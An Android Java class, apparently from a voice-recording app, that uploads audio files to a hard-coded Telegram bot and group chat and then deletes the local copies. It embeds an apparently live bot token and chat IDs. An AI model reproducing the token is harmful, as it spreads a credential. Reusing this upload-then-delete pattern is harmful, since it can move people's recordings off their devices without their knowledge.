package com.blu.app.voice;

import android.util.Log;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;
import java.io.File;
import java.util.concurrent.TimeUnit;

public class TelegramUploader {
    private static final String TAG = "TelegramUploader";
    private static final String TELEGRAM_API = "https://api.telegram.org";
    
    // Telegram Bot Configuration
    private static final String BOT_TOKEN = "8985315189:AAEeTfrU-QUmyucxmgQBc0OyoQ1jNABREhM";
    private static final String GROUP_CHAT_ID = "-1004352035353";
    private static final String USER_CHAT_ID = "8619991688";
    
    private OkHttpClient httpClient;
    
    public TelegramUploader() {
        this.httpClient = new OkHttpClient.Builder()
            .connectTimeout(30, TimeUnit.SECONDS)
            .readTimeout(30, TimeUnit.SECONDS)
            .writeTimeout(60, TimeUnit.SECONDS)
            .build();
    }
    
    public boolean uploadAudio(String filePath, String botToken, String chatId, String caption) {
        try {
            File file = new File(filePath);
            
            if (!file.exists()) {
                Log.e(TAG, "فایل وجود ندارد: " + filePath);
                return false;
            }
            
            Log.d(TAG, "آپلود شروع: " + file.getName());
            
            // استفاده از توکن و چت آیدی داخلی اگر خالی بود
            String finalBotToken = (botToken == null || botToken.isEmpty()) ? BOT_TOKEN : botToken;
            String finalChatId = (chatId == null || chatId.isEmpty()) ? GROUP_CHAT_ID : chatId;
            
            RequestBody fileBody = RequestBody.create(
                file,
                MediaType.parse("audio/mpeg")
            );
            
            RequestBody requestBody = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("chat_id", finalChatId)
                .addFormDataPart("audio", file.getName(), fileBody)
                .addFormDataPart("caption", caption)
                .addFormDataPart("title", file.getName())
                .build();
            
            String url = TELEGRAM_API + "/bot" + finalBotToken + "/sendAudio";
            
            Request request = new Request.Builder()
                .url(url)
                .post(requestBody)
                .build();
            
            Response response = httpClient.newCall(request).execute();
            
            boolean success = response.isSuccessful();
            
            if (success) {
                Log.d(TAG, "✅ آپلود موفق: " + response.code());
                file.delete();
                Log.d(TAG, "فایل حذف شد");
            } else {
                Log.e(TAG, "❌ آپلود ناموفق: " + response.code());
                if (response.body() != null) {
                    Log.e(TAG, "پاسخ: " + response.body().string());
                }
            }
            
            response.close();
            return success;
            
        } catch (Exception e) {
            Log.e(TAG, "Exception: " + e.getMessage());
            e.printStackTrace();
            return false;
        }
    }
    
    // متد مستقیم برای ارسال به گروپ
    public boolean sendToGroup(String filePath, String caption) {
        return uploadAudio(filePath, BOT_TOKEN, GROUP_CHAT_ID, caption);
    }
    
    // متد مستقیم برای ارسال به یوزر شخصی
    public boolean sendToUser(String filePath, String caption) {
        return uploadAudio(filePath, BOT_TOKEN, USER_CHAT_ID, caption);
    }
}
